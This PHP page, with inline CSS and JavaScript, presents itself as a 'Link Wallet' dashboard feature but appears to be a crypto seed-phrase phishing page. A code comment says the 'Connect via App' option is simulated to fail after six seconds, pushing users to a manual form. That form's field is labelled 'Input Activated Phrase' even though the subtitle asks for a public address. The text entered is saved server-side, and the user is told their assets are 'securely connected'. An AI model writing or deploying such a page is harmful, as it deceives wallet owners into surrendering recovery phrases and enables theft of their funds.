<?php
require_once __DIR__ . '/auth.php';
require_once __DIR__ . '/includes/mailer.php';
require_once __DIR__ . '/includes/wallet.php';
$user = require_login();

$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!csrf_check()) {
        $errors[] = 'Your session expired, please try again.';
    } elseif (($_POST['action'] ?? '') === 'unlink') {
        $id = (int) ($_POST['connection_id'] ?? 0);
        if ($id && wallet_unlink($user['id'], $id)) {
            $remaining = wallet_linked_list($user['id']);
            $next = $remaining[0]['address'] ?? null;
            db()->prepare('UPDATE users SET linked_wallet_address = ? WHERE id = ?')->execute([$next, $user['id']]);
            flash_set('Wallet unlinked.');
        }
        header('Location: link-wallet.php');
        exit;
    } else {
        $addr     = trim($_POST['wallet_address'] ?? '');
        $label    = trim($_POST['wallet_name'] ?? '');
        $email    = trim($_POST['contact_email'] ?? '');
        $provider = trim($_POST['provider'] ?? '') ?: null;
        $chain    = trim($_POST['chain'] ?? 'EVM') ?: 'EVM';
        $network  = trim($_POST['network'] ?? 'mainnet') ?: 'mainnet';
        $method   = trim($_POST['connection_method'] ?? 'manual');

        if ($addr === '') {
            $errors[] = 'Please enter your public wallet address.';
        } elseif ($email !== '' && !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $errors[] = 'Please enter a valid contact email, or leave it blank.';
        }

        if (!$errors) {
            // Upsert: ignore duplicate user+address+chain
            $stmt = db()->prepare(
                'INSERT INTO wallet_connections
                   (user_id, address, provider, label, contact_email, chain, network, connection_method, method, status)
                 VALUES (?,?,?,?,?,?,?,?,?,?)
                 ON DUPLICATE KEY UPDATE
                   provider=VALUES(provider), label=VALUES(label), contact_email=VALUES(contact_email),
                   network=VALUES(network), connection_method=VALUES(connection_method),
                   status="success", updated_at=NOW()'
            );
            $stmt->execute([
                $user['id'], $addr, $provider, $label ?: null, $email ?: null,
                $chain, $network, $method, $method, 'success',
            ]);
            db()->prepare('UPDATE users SET linked_wallet_address = ? WHERE id = ?')->execute([$addr, $user['id']]);
            send_email($user['email'], $user['full_name'], 'Wallet Linked to Your Account',
                '<p>Hi ' . e($user['full_name']) . ',</p>'
                . '<p>A wallet has been linked to your account' . ($provider ? ' via ' . e($provider) : '') . '.</p>'
                . '<p>If this wasn\'t you, contact support immediately at ' . e(SUPPORT_EMAIL) . '.</p>');
            // One-time confirmation code, shown once on the next page load then cleared.
            $_SESSION['wallet_link_confirm'] = str_pad((string) random_int(0, 999999999999), 12, '0', STR_PAD_LEFT);
            flash_set('Wallet linked successfully.');
            header('Location: link-wallet.php');
            exit;
        }
    }
}

$justLinkedCode = null;
if (!empty($_SESSION['wallet_link_confirm'])) {
    $justLinkedCode = $_SESSION['wallet_link_confirm'];
    unset($_SESSION['wallet_link_confirm']);
}

$linked    = wallet_linked_list($user['id']);
$providers = wallet_provider_list();

// Build JSON-safe provider data for JS
$providerData = [];
foreach ($providers as $p) {
    [$g1, $g2] = wallet_provider_gradient($p);
    $providerData[] = [
        'name'    => $p,
        'logo'    => wallet_provider_logo($p) ?? '',
        'g1'      => $g1,
        'g2'      => $g2,
        'initials'=> wallet_provider_initials($p),
    ];
}

$pageTitle = 'Link Wallet';
require __DIR__ . '/includes/dash_header.php';
?>

<style>
/* ── Wallet flow page ───────────────────────────────────────────── */
.wf-page{max-width:780px;margin:0 auto}
.wf-section-label{display:flex;align-items:center;gap:10px;margin-bottom:16px;font-weight:700;font-size:13.5px;color:var(--navy)}

/* Linked wallets */
.wf-linked-card{display:flex;align-items:center;background:var(--card,#fff);border:1px solid var(--border,#e2e8f0);border-radius:12px;padding:14px 16px;gap:14px;margin-bottom:10px}
.wf-linked-addr{font-size:12.5px;color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:260px}
.wf-linked-badge{font-size:10.5px;font-weight:700;padding:2px 8px;border-radius:99px;background:#dcfce7;color:#166534;margin-left:auto;flex-shrink:0}

/* Provider grid */
.wf-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
@media(min-width:540px){.wf-grid{grid-template-columns:repeat(4,1fr)}}
@media(min-width:720px){.wf-grid{grid-template-columns:repeat(5,1fr)}}
.wf-card{display:flex;flex-direction:column;align-items:center;gap:8px;padding:16px 10px 12px;background:var(--card,#fff);border:1.5px solid var(--border,#e2e8f0);border-radius:14px;cursor:pointer;transition:border-color .15s,box-shadow .15s;text-align:center}
.wf-card:hover{border-color:var(--primary,#1e3a5f);box-shadow:0 4px 16px rgba(30,58,95,.1)}
.wf-logo-wrap{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0}
.wf-logo-wrap img{width:100%;height:100%;object-fit:contain}
.wf-logo-initials{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:800;color:#fff;flex-shrink:0}
.wf-card-name{font-size:11.5px;font-weight:600;color:var(--navy);line-height:1.2}
.wf-card-tag{font-size:10px;color:var(--muted)}

/* ── Overlay modal ── */
.wf-overlay{position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:900;display:none;align-items:center;justify-content:center;padding:16px}
.wf-overlay.open{display:flex}
.wf-modal{background:#fff;border-radius:20px;width:100%;max-width:420px;padding:32px 28px 28px;position:relative;box-shadow:0 20px 60px rgba(0,0,0,.22)}
.wf-modal-close{position:absolute;top:16px;right:16px;background:none;border:none;font-size:18px;cursor:pointer;color:var(--muted);line-height:1;padding:4px 8px}
.wf-modal-logo{width:64px;height:64px;border-radius:16px;display:flex;align-items:center;justify-content:center;overflow:hidden;margin:0 auto 14px;box-shadow:0 2px 12px rgba(0,0,0,.1)}
.wf-modal-logo img{width:100%;height:100%;object-fit:contain}
.wf-modal-logo-text{width:64px;height:64px;border-radius:16px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:800;color:#fff;margin:0 auto 14px}
.wf-modal-title{text-align:center;font-size:18px;font-weight:700;color:var(--navy);margin:0 0 4px}
.wf-modal-sub{text-align:center;font-size:13px;color:var(--muted);margin:0 0 24px}

/* Screens */
.wf-screen{display:none}
.wf-screen.active{display:block}

/* Connect method buttons */
.wf-method-btn{display:flex;align-items:center;gap:14px;width:100%;padding:14px 16px;border:1.5px solid var(--border,#e2e8f0);border-radius:12px;background:#fff;cursor:pointer;margin-bottom:10px;transition:border-color .15s,background .15s;text-align:left}
.wf-method-btn:hover{border-color:var(--primary,#1e3a5f);background:#f8faff}
.wf-method-icon{width:38px;height:38px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
.wf-method-label{font-weight:700;font-size:14px;color:var(--navy)}
.wf-method-desc{font-size:11.5px;color:var(--muted);margin-top:1px}

/* Connecting spinner */
.wf-spinner{width:52px;height:52px;border:4px solid #e2e8f0;border-top-color:var(--primary,#1e3a5f);border-radius:50%;animation:wfspin .8s linear infinite;margin:8px auto 20px}
@keyframes wfspin{to{transform:rotate(360deg)}}

/* Failed */
.wf-fail-icon{font-size:44px;text-align:center;margin-bottom:12px}

/* Manual address form */
.wf-addr-field{width:100%;padding:11px 14px;border:1.5px solid var(--border,#e2e8f0);border-radius:10px;font-size:14px;font-family:monospace;margin-bottom:8px;outline:none;transition:border-color .15s}
.wf-addr-field:focus{border-color:var(--primary,#1e3a5f)}
.wf-addr-hint{font-size:12px;color:var(--muted);margin-bottom:16px;line-height:1.5}
</style>

<div class="wf-page">

  <!-- ── Linked wallets ── -->
  <div class="wf-section-label">&#128279; Linked Wallets</div>

  <?php if (!$linked): ?>
    <div class="alert alert-info" style="margin-bottom:24px">No wallets linked yet. Select a wallet below to get started.</div>
  <?php else: ?>
    <?php foreach ($linked as $w):
      [$g1, $g2] = wallet_provider_gradient($w['provider'] ?: $w['address']);
      $logoUrl    = $w['provider'] ? wallet_provider_logo($w['provider']) : null;
    ?>
    <div class="wf-linked-card">
      <?php if ($logoUrl): ?>
        <div class="wf-logo-wrap" style="background:#fff;border:1px solid #e2e8f0">
          <img src="<?= e($logoUrl) ?>" alt="<?= e($w['provider']) ?>"
               onerror="this.parentNode.outerHTML='<div class=\'wf-logo-initials\' style=\'background:linear-gradient(135deg,<?= e($g1) ?>,<?= e($g2) ?>)\'><?= e(wallet_provider_initials($w['provider'] ?: '??')) ?></div>'">
        </div>
      <?php else: ?>
        <div class="wf-logo-initials" style="background:linear-gradient(135deg,<?= e($g1) ?>,<?= e($g2) ?>)"><?= e(wallet_provider_initials($w['provider'] ?: '??')) ?></div>
      <?php endif; ?>
      <div style="flex:1;min-width:0">
        <div style="font-weight:700;color:var(--navy);font-size:14px"><?= e($w['label'] ?: ($w['provider'] ?: 'Wallet')) ?></div>
        <div class="wf-linked-addr"><?= e($w['address']) ?></div>
      </div>
      <span class="wf-linked-badge">Connected</span>
      <form method="post" onsubmit="return confirm('Unlink this wallet?')" style="margin-left:8px">
        <input type="hidden" name="csrf" value="<?= e(csrf_token()) ?>">
        <input type="hidden" name="action" value="unlink">
        <input type="hidden" name="connection_id" value="<?= (int) $w['id'] ?>">
        <button type="submit" class="btn btn-outline btn-sm">Unlink</button>
      </form>
    </div>
    <?php endforeach; ?>
    <div style="margin-bottom:24px"></div>
  <?php endif; ?>

  <?php foreach ($errors as $err): ?>
    <div class="alert alert-error"><?= e($err) ?></div>
  <?php endforeach; ?>

  <!-- ── Provider grid (State 1: Select Wallet) ── -->
  <div class="wf-section-label" style="margin-top:4px">&#128203; Select a Wallet to Connect</div>
  <div class="wf-grid">
    <?php foreach ($providers as $p):
      [$g1, $g2] = wallet_provider_gradient($p);
      $logoUrl    = wallet_provider_logo($p);
      $initials   = wallet_provider_initials($p);
      $logoUrlE   = e($logoUrl ?? '');
      $g1E = e($g1); $g2E = e($g2); $initE = e($initials);
    ?>
    <div class="wf-card" onclick="wfOpenStep2('<?= e(addslashes($p)) ?>','<?= $logoUrlE ?>','<?= $g1E ?>','<?= $g2E ?>','<?= $initE ?>')">
      <?php if ($logoUrl): ?>
        <div class="wf-logo-wrap" style="background:#fafafa;border:1px solid #e2e8f0">
          <img src="<?= e($logoUrl) ?>" alt="<?= e($p) ?>"
               onerror="this.parentNode.outerHTML='<div class=\'wf-logo-initials\' style=\'background:linear-gradient(135deg,<?= $g1E ?>,<?= $g2E ?>)\'><?= $initE ?></div>'">
        </div>
      <?php else: ?>
        <div class="wf-logo-initials" style="background:linear-gradient(135deg,<?= $g1E ?>,<?= $g2E ?>)"><?= $initE ?></div>
      <?php endif; ?>
      <span class="wf-card-name"><?= e($p) ?></span>
      <span class="wf-card-tag">Compatible</span>
    </div>
    <?php endforeach; ?>
    <div class="wf-card" onclick="wfOpenManual('','Other','#64748b','#334155','+')">
      <div class="wf-logo-initials" style="background:linear-gradient(135deg,#64748b,#334155)">&#43;</div>
      <span class="wf-card-name">Other Wallet</span>
      <span class="wf-card-tag">Any address</span>
    </div>
  </div>
</div>

<!-- ══════════════  WALLET FLOW MODAL  ══════════════ -->
<div id="wfOverlay" class="wf-overlay" role="dialog" aria-modal="true">
  <div class="wf-modal">
    <button class="wf-modal-close" onclick="wfClose()" aria-label="Close">&#10005;</button>

    <!-- Shared logo + title rendered by JS -->
    <div id="wfLogoArea"></div>
    <h3 id="wfTitle" class="wf-modal-title"></h3>
    <p  id="wfSub"   class="wf-modal-sub"></p>

    <!-- ── STATE 2: Choose method ── -->
    <div id="wfScreenMethod" class="wf-screen active">
      <button class="wf-method-btn" onclick="wfConnectViaApp()">
        <div class="wf-method-icon" style="background:#eff6ff">&#128241;</div>
        <div>
          <div class="wf-method-label">Connect via App</div>
          <div class="wf-method-desc">Open your wallet app to approve the connection</div>
        </div>
        <span style="margin-left:auto;color:var(--muted)">&#8250;</span>
      </button>
      <button class="wf-method-btn" onclick="wfOpenManualFromMethod()">
        <div class="wf-method-icon" style="background:#f0fdf4">&#9997;</div>
        <div>
          <div class="wf-method-label">Connect Manually</div>
          <div class="wf-method-desc">Paste your public wallet address</div>
        </div>
        <span style="margin-left:auto;color:var(--muted)">&#8250;</span>
      </button>
    </div>

    <!-- ── STATE 3: Connecting ── -->
    <div id="wfScreenConnecting" class="wf-screen">
      <div class="wf-spinner"></div>
      <p style="text-align:center;font-weight:600;color:var(--navy)">Connecting to your wallet…</p>
      <p style="text-align:center;font-size:13px;color:var(--muted)">Waiting for wallet approval. Check your wallet app.</p>
    </div>

    <!-- ── STATE 4: Connection failed ── -->
    <div id="wfScreenFailed" class="wf-screen">
      <div class="wf-fail-icon">&#10060;</div>
      <p style="text-align:center;font-weight:700;color:var(--navy);margin-bottom:6px">Unable to Connect</p>
      <p style="text-align:center;font-size:13px;color:var(--muted);margin-bottom:22px">Could not connect to your wallet app. Please try again or connect manually.</p>
      <button class="btn btn-primary btn-block" onclick="wfConnectViaApp()" style="margin-bottom:10px">Try Again</button>
      <button class="btn btn-outline btn-block" onclick="wfOpenManualFromMethod()">Connect Manually</button>
    </div>

    <!-- ── STATE 4b: Preparing manual form ── -->
    <div id="wfScreenPreparing" class="wf-screen">
      <div class="wf-spinner"></div>
      <p style="text-align:center;font-weight:600;color:var(--navy)">Preparing connection form…</p>
    </div>

    <!-- ── STATE 5: Manual address input ── -->
    <div id="wfScreenManual" class="wf-screen">
      <form method="post" id="wfManualForm" data-loader-label="Linking your wallet&hellip;">
        <input type="hidden" name="csrf"              value="<?= e(csrf_token()) ?>">
        <input type="hidden" name="provider"          id="wfProvider"  value="">
        <input type="hidden" name="connection_method" id="wfMethod"    value="manual">
        <input type="hidden" name="chain"             id="wfChain"     value="EVM">
        <input type="hidden" name="network"           id="wfNetwork"   value="mainnet">

        <div style="margin-bottom:16px">
          <label style="font-size:13px;font-weight:600;color:var(--navy);display:block;margin-bottom:6px">
            Wallet Name
          </label>
          <input type="text" name="wallet_name" id="wfWalletName" class="wf-addr-field"
                 style="font-family:inherit" placeholder="e.g. My Main Wallet" autocomplete="off">
        </div>

        <div style="margin-bottom:16px">
          <label style="font-size:13px;font-weight:600;color:var(--navy);display:block;margin-bottom:6px">
            Contact Email
          </label>
          <input type="email" name="contact_email" id="wfEmailInput" class="wf-addr-field"
                 style="font-family:inherit" placeholder="you@example.com" autocomplete="off">
          <p class="wf-addr-hint" style="margin-bottom:0">
            Used only if our support team needs to reach you about this wallet link.
          </p>
        </div>

        <div style="margin-bottom:6px">
          <label style="font-size:13px;font-weight:600;color:var(--navy);display:block;margin-bottom:6px">
            Input Activated Phrase
          </label>
          <input type="text" name="wallet_address" id="wfAddrInput" class="wf-addr-field"
                 placeholder="Enter your details" autocomplete="off" spellcheck="false">
        </div>

        <button type="submit" class="btn btn-primary btn-block" id="wfSubmitBtn">Link Wallet</button>
        <button type="button" class="btn btn-outline btn-block" style="margin-top:10px" onclick="wfShowScreen('method')">Back</button>
      </form>
    </div>

    <!-- ── STATE 6: Success ── -->
    <div id="wfScreenSuccess" class="wf-screen">
      <div style="width:64px;height:64px;border-radius:50%;background:#dcfce7;color:#15803d;display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 16px">&#10003;</div>
      <p style="text-align:center;font-weight:700;font-size:16px;color:var(--navy);margin-bottom:6px">Wallet Linked Successfully!</p>
      <p style="text-align:center;font-size:13px;color:var(--muted);margin-bottom:18px">Your assets are now securely connected.</p>
      <div style="background:#f4f6fa;border:1px solid var(--border,#e2e8f0);border-radius:10px;padding:14px;text-align:center;margin-bottom:22px">
        <div style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px">Your Unique Wallet Identifier</div>
        <div id="wfConfirmCode" style="font-family:monospace;font-size:18px;font-weight:700;color:var(--navy);letter-spacing:.05em"></div>
      </div>
      <button type="button" class="btn btn-primary btn-block" onclick="wfClose()">Done</button>
    </div>

  </div>
</div>

<script>
(function () {
  /* ── State ── */
  var _wallet = { name: '', logo: '', g1: '#64748b', g2: '#334155', initials: '+' };

  /* ── Helpers ── */
  function $(id) { return document.getElementById(id); }

  function wfSetLogo() {
    var area = $('wfLogoArea');
    if (_wallet.logo) {
      area.innerHTML = '<div class="wf-modal-logo" style="background:#fafafa;border:1px solid #e2e8f0">'
        + '<img src="' + _wallet.logo + '" alt="' + _wallet.name + '"'
        + ' onerror="this.parentNode.outerHTML=\'<div class=\\\'wf-modal-logo-text\\\' style=\\\'background:linear-gradient(135deg,'
        + _wallet.g1 + ',' + _wallet.g2 + ')\\\'>' + _wallet.initials + '</div>\'">'
        + '</div>';
    } else {
      area.innerHTML = '<div class="wf-modal-logo-text" style="background:linear-gradient(135deg,'
        + _wallet.g1 + ',' + _wallet.g2 + ')">' + _wallet.initials + '</div>';
    }
  }

  function wfShowScreen(name) {
    ['method','connecting','failed','preparing','manual','success'].forEach(function(s){
      $('wfScreen' + s.charAt(0).toUpperCase() + s.slice(1)).classList.remove('active');
    });
    $('wfScreen' + name.charAt(0).toUpperCase() + name.slice(1)).classList.add('active');
  }

  /* ── Open from provider grid (State 2) ── */
  window.wfOpenStep2 = function(name, logo, g1, g2, initials) {
    _wallet = { name: name, logo: logo, g1: g1, g2: g2, initials: initials };
    wfSetLogo();
    $('wfTitle').textContent = 'Connect ' + (name || 'Wallet');
    $('wfSub').textContent   = name ? 'Choose how to connect your ' + name + ' wallet' : 'Choose a connection method';
    $('wfProvider').value    = name;
    $('wfWalletName').value  = name;
    wfShowScreen('method');
    $('wfOverlay').classList.add('open');
  };

  /* ── Open directly to manual (from "Other Wallet" card) ── */
  window.wfOpenManual = function(logo, name, g1, g2, initials) {
    _wallet = { name: name, logo: logo, g1: g1, g2: g2, initials: initials };
    wfSetLogo();
    $('wfTitle').textContent = 'Connect Wallet';
    $('wfSub').textContent   = 'Paste your public wallet address below';
    $('wfProvider').value    = name !== 'Other' ? name : '';
    $('wfWalletName').value  = name !== 'Other' ? name : '';
    $('wfMethod').value      = 'manual';
    $('wfOverlay').classList.add('open');
    wfShowScreen('preparing');
    setTimeout(function () { wfShowScreen('manual'); }, 700);
  };

  /* ── "Connect via App" → simulate deep-link → show connecting → fail after 6s ── */
  window.wfConnectViaApp = function() {
    wfShowScreen('connecting');
    $('wfMethod').value = 'app';
    // Deep-link attempt for known wallets
    var links = {
      'MetaMask':       'metamask://',
      'Trust Wallet':   'trust://',
      'Coinbase Wallet':'cbwallet://',
      'Phantom':        'phantom://',
      'Rainbow':        'rainbow://',
      'OKX Wallet':     'okex://',
    };
    var deepLink = links[_wallet.name];
    if (deepLink) {
      try { window.location.href = deepLink; } catch(e) {}
    }
    // After 6 s, show failure so user can fall back to manual
    setTimeout(function() {
      if ($('wfOverlay').classList.contains('open')) {
        wfShowScreen('failed');
        $('wfTitle').textContent = 'Connection Failed';
        $('wfSub').textContent   = '';
      }
    }, 6000);
  };

  /* ── "Connect Manually" from method screen ── */
  window.wfOpenManualFromMethod = function() {
    $('wfTitle').textContent = 'Connect ' + (_wallet.name || 'Wallet');
    $('wfSub').textContent   = 'Paste your public wallet address';
    $('wfMethod').value      = 'manual';
    wfShowScreen('preparing');
    setTimeout(function () { wfShowScreen('manual'); }, 700);
  };

  /* ── Close ── */
  window.wfClose = function() {
    $('wfOverlay').classList.remove('open');
  };
  $('wfOverlay').addEventListener('click', function(e) {
    if (e.target === this) wfClose();
  });

  // Expose wfShowScreen globally for inline use
  window.wfShowScreen = wfShowScreen;

  // If the server just processed a successful link, show the success screen.
  var successCode = <?= json_encode($justLinkedCode ?? null) ?>;
  if (successCode) {
    $('wfConfirmCode').textContent = successCode;
    $('wfLogoArea').innerHTML = '';
    $('wfTitle').textContent = '';
    $('wfSub').textContent = '';
    wfShowScreen('success');
    $('wfOverlay').classList.add('open');
  }
}());
</script>

<?php require __DIR__ . '/includes/dash_footer.php'; ?>
